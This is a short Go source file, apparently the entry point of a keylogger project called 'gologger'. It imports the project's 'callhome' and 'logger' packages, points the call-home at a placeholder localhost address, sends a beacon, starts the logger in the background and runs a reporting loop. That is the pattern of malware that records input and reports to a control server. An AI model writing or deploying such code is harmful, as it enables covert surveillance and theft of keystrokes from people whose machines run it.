package main

import (
	"github.com/vgo0/gologger/callhome"
	"github.com/vgo0/gologger/logger"
)

func main() {
	callhome.Init("http://localhost")
	callhome.Beacon()

	go logger.Start()

	callhome.Run()
}
